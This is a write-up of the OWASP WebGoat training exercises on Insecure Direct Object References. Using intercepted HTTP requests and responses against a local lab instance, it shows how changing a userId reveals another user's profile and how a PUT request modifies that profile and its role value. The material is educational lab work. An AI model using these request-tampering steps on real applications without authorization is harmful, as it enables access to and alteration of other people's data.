# Insecure Direct Object References

## Direct Object Reference Definition
- when an application uses client-provided input to access data and objects.

## Examples
```
https://some.company.tld/dor?id=12345
https://some.company.tld/images?img=12345
https://some.company.tld/dor/12345
```
- other methods include `POST`, `PUT`, `DELETE`
- all these are potentially susceptible
- mainly only differ in the method and the potential payload

## Insecure Direct Object References
- happens when the reference is not properly handled
- allows for authorization bypasses
- or disclose private data
- these could be used to perform operations or access data
- that the user should not be able to perform or access.

## Exercise 1
Authenticate first, input:
```
user: tom
password: cat
```
![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/28%20IDOR%20authorize%20first.PNG?token=ANjmpuwc46YueC3e21SAI5e7_TRv5jeOks5b1cB5wA%3D%3D)

## Exercise 2
Task:
Find the raw data that is in the raw response but is not shown on the page.
![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/29%20IDOR%20view%20profile.PNG?token=ANjmpmFdJgiS0mD22C6WXE0qtvJ7Fqf-ks5b1cCNwA%3D%3D)

Intercept the request/response with burp:
```
HTTP/1.1 200
X-Application-Context: application:8080
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Date: Sun, 21 Oct 2018 12:34:47 GMT
Connection: close
Content-Length: 110

{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}
```
The two different fields are: role and userId.

## Exercise 3
Task: guess the url manipulation

Look at the previous request:
```
GET /WebGoat/IDOR/profile HTTP/1.1
Host: localhost:8080
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://localhost:8080/WebGoat/start.mvc
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=CA367C98E91986B2DA85E5293B72885B
Connection: close
```
Note that the url is `/WebGoat/IDOR/profile`

Remember that in the previous exercise, we found that userId=`2342384`

Therefore the manipulated URL is:
```
WebGoat/IDOR/profile/2342384
```

## Exercise 4
Task 1: View another profile
```
Entering your own profile:

GET /WebGoat/IDOR/profile/2342384 HTTP/1.1
Host: localhost:8080
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://localhost:8080/WebGoat/start.mvc
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=CA367C98E91986B2DA85E5293B72885B
Connection: close

Response:

HTTP/1.1 200
X-Application-Context: application:8080
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Date: Sun, 21 Oct 2018 13:40:13 GMT
Connection: close
Content-Length: 186

{
  "lessonCompleted" : false,
  "feedback" : "Try again. You need to use the same method\\/URL you used to access your own profile via direct object reference.",
  "output" : null
}
```
Change the userId in the request:
```
GET /WebGoat/IDOR/profile/2342388
```
Results:
```
{
  "lessonCompleted" : true,
  "feedback" : "Well done, you found someone else's profile",
  "output" : "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}"
}
```

Task 2: Edit another profile
```
PUT /WebGoat/IDOR/profile/2342388 HTTP/1.1
Host: localhost:8080
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/json
Referer: http://localhost:8080/WebGoat/start.mvc
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=CA367C98E91986B2DA85E5293B72885B
Connection: close
Content-Length: 45

{"userId":"2342388","role":"0","color":"red"}
```
- Change the `GET` request to `PUT`
- Change the Content-Type to `application/json`
- Add the contents: `{"userId":"2342388","role":"0","color":"red"}`

Output:
```
HTTP/1.1 200
X-Application-Context: application:8080
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Date: Sun, 21 Oct 2018 13:55:15 GMT
Connection: close
Content-Length: 208

{
  "lessonCompleted" : true,
  "feedback" : "Well done, you have modified someone else's profile (as displayed below)",
  "output" : "{role=0, color=red, size=large, name=Buffalo Bill, userId=2342388}"
}
```
